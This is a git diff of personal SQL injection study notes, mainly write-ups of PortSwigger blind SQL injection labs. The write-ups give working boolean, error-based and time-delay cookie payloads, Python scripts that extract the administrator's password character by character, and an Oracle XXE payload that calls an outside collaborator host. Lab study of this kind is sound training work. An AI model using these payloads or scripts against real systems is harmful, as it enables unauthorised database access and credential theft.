@@ -1,4 +1,10 @@
 # SQL Injection
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
 ## Select Data from information_schema
 
 - All database which the user has access
@@ -186,6 +192,16 @@ Again, the application might actually return this error message, or might just r
 
 > The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
 > 
+
+- Union select on Oracel
+
+```sql
+' UNION SELECT NULL from dual--
+```
+
+On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
+
+There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
 
 ## ****Finding columns with a useful data type in an SQL injection UNION attack****
 
@@ -530,15 +546,15 @@ To solve the lab, log in as the `administrator` user.
 
 I have a tracking id in cookeis like this :TrackingId=NqZivwgKPtLKDW0x;
 
-I can see “welcome back!” if this trakingId be correct, otherwise nothing.
+I can see “welcome back!” in home page, if this trakingId be correct, otherwise nothing.
 
-then I added a boolean condition next of tracking id:
+Now I add a boolean condition next of tracking id:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1=1-- 
 ```
 
-again I see “Welcome back!”, then I tested another case:
+again I see “Welcome back!”, then I want to test another case:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1=2--
@@ -546,19 +562,17 @@ TrackingId=NqZivwgKPtLKDW0x' and 1=2--
 
 but this time nothing.
 
-so there is a sqli. first I need to know length of password. so I wrote this:
+so that’s mean there is a sqli. first I need to know length of password. so I wrote this:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1<(select length(password) from user where username='administrator')--
 ```
 
-again I see “Welcome back!”, so that’s mean the length is greater than of number one. after play with number, I found out the length is 20
+again I see “Welcome back!”, so clearly, the length is greater than of number one. after play with number, I found out the length is 20
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 20=(select length(password) from user where username='administrator')--
 ```
-
-again I see “Welcome back!”
 
 Now I need to write a script to extract 20 chars of administrator’s password.
 
@@ -615,4 +629,223 @@ def _dump_char():
 
 with requests.Session () as s:
     print(_dump_char())
+```
+
+- **LAB2**: [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+**My Solution:** 
+
+For this challenge I need to find an error condition. First I test it:
+
+```sql
+TrackingId=w9jrPJv9nbvMV3Jz' and 1=2--
+```
+
+Nothing, test another case:
+
+```sql
+TrackingId=w9jrPJv9nbvMV3Jz' and 1=TO_CAHR(1/0)--
+```
+
+Boom Error. (Database is Oracel).
+
+Now I need to know length of database:
+
+```sql
+TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ((select length(password) from users where username='administrator')=21) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+```
+
+Nothing, test another case:
+
+```sql
+TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ((select length(password) from users where username='administrator')=20) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+```
+
+Boom Error, Database length is 20.
+
+Now I need to extract password from database. 
+
+```sql
+GET / HTTP/1.1
+Host: 0a0f00810350486bc022179800ff00c7.web-security-academy.net
+Cookie: TrackingId=w9jrPJv9nbvMV3Jz' and 1=(SELECT CASE WHEN ('h'=substr((select password from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--; session=f17ws8nSrFNcRFkM1JVdwqvXyBcc0bm0
+Sec-Ch-Ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0f00810350486bc022179800ff00c7.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fa;q=0.8
+Connection: close
+```
+
+The first char of password is h.
+
+Now I run this exploit:
+
+```sql
+import requests
+from bs4 import BeautifulSoup as BS
+import re
+from itertools import chain
+
+def _check_bool(query):
+
+    cookies = {
+            "TrackingId":f"w9jrPJv9nbvMV3Jz' and {query}",
+            "session":"kfZso9yB7U0rwIVOktJhRv4yTNSSnadv",
+            }
+    req= s.get('https://0a5800940343c617c055020700970091.web-security-academy.net/', cookies=cookies)
+
+    if req.status_code >= 500:
+        return True
+    else:
+        return False
+
+def _dump_char():
+
+    # ASCII CHAR a-z ==> 97-122
+    # ASCII CHAR A-Z ==> 65-90
+    # ASCII 0-9 => 48-57
+    # ASCII CHAR _ => 95
+    # ASCII CHAR , => 44
+    result = ''
+
+    dump_length = 22
+
+    print(dump_length, end="\n", flush=True)
+
+    for l in range(1, dump_length+1):
+        ascii_chars = chain(range(97, 123),
+                range(48, 58), range(95, 96), range(44, 45))
+        for char in ascii_chars:
+            query=f"1=(SELECT CASE WHEN ({char}=ASCII(substr((select password from users where username='administrator'),{l},1))) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
+            res = _check_bool(query)
+            if res:
+                print(chr(char), end="", flush=True)
+                result = result + chr(char)
+                break
+
+    print("\n")
+    return result
+
+with requests.Session () as s:
+    print(_dump_char())
+```
+
+- **LAB:Blind SQL injection with time delays and information retrieval
+url:**[https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+Solution:
+
+First I need to know what is the sql type, after tests, I found this challenge using Postgresql.
+
+```sql
+Cookie: TrackingId=zbDwYeFRnryEXDOp' || pg_sleep(10)--;
+```
+
+Now I need the length of password: it’s 20
+
+```sql
+GET / HTTP/1.1
+Host: 0a6e001c039be6c6c095349f007700fa.web-security-academy.net
+Cookie: TrackingId=zbDwYeFRnryEXDOp' || (SELECT CASE WHEN ((select length(password) from users where username='administrator')=20) THEN pg_sleep(3) ELSE pg_sleep(0) END)--; session=u1wC4Yp3TnA2gz91WYB54O2NDk6T1H4M
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua: "Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fa;q=0.8
+Connection: close
+```
+
+let’s find a query to fetch password:
+
+```sql
+Cookie: TrackingId=zbDwYeFRnryEXDOp' || (SELECT CASE WHEN ('b'=substr((select password from users where username='administrator'),5,1)) THEN pg_sleep(3) ELSE pg_sleep(0) END)--;
+```
+
+Now With a python code I can fetch all chars of password:
+
+```sql
+import requests
+from itertools import chain
+
+def _check_bool(query):
+    cookies = {
+            "TrackingId":f"zbDwYeFRnryEXDOp' || {query}",
+            "session":"u1wC4Yp3TnA2gz91WYB54O2NDk6T1H4M",
+            }
+
+    req = s.get("https://0a6e001c039be6c6c095349f007700fa.web-security-academy.net", cookies=cookies)
+
+    if req.elapsed.total_seconds() >= 3:
+        return True
+    else:
+        return False
+
+def _dump_char():
+    result=''
+    dump_length=21
+
+    for l in range(1, dump_length+1):
+        ascii_chars = chain(range(97,123),range(48,58))
+        for char in ascii_chars:
+            query = f"(SELECT CASE WHEN ({char}=ascii(substr((select password from users where username='administrator'),{l},1))) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+
+            res = _check_bool(query)
+            if res:
+                print(chr(char), end="", flush=True)
+                result = result + chr(char)
+                break
+
+    print("\n")
+    return result
+
+with requests.Session() as s:
+    _dump_char()
+```
+
+****Lab: Blind SQL injection with out-of-band data exfiltration****
+
+url: [https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+This solution works for Oracel SQL
+
+```sql
++UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//jsfl9x72zpfgcjxyr6txhc75awgm4b.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
